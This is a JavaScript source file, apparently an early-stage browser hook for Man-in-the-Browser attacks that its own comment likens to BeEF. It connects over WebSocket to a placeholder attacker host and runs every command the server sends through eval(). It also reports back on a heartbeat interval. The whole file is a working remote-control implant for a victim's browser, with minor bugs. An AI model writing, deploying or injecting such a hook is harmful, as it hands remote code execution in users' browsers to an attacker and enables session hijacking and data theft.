//alert("This will be a hook similar to BeeF for Man In The Browser attacks");

const poll_url = "[[HOST_REPLACE_ME]]/w".replace("http", "ws");

var res={poll:"hearthbeat", id:"", action_results:[]}
var tries = 0
while (tries < 3) {
    console.log("Try: "+tries)
    try { 
        var socket = new WebSocket(poll_url);
        if (socket != null && socket != undefined) {
            console.log(socket);
            socket.onopen = function () {
                console.log("Status: connected.")
            };
        
            socket.onmessage = function (e) {
                res={poll:"hearthbeat", id:"", action_results:[]}
                console.log("Server sent:"+e.data)
                var serversays=JSON.parse(e.data)
                console.log(serversays)
                console.log(serversays.commands)
                for(var i=0;i<serversays.commands.length+1;i++) {
                    try {
                        console.log("Executing command:")
                        console.log(serversays["commands"][i])
                        eval(serversays["commands"][i])
                        //res["action_results"]={serversays["commands"][i]:true} //TODO: fix. Same command sent twice gets status overwritten
                    } catch(e) {
                        console.log(e)
                        //res["action_results"]={serversays["commands"][i]:false}
                    }
                }
            };    

            socket.onclose = function(event) {
                console.log("TODO: cleanup")
            };
            
            break;
        }
    } catch(e) {
        console.log(e)
        tries++;
        setTimeout(function(){
            sleep(1000);
        })
    }
}

// All good, we can start polling
if (tries < 3) {
    setInterval(function poll() {
        socket.send(JSON.stringify(res));
    }, 2000);
} else {
    //Send error?
}

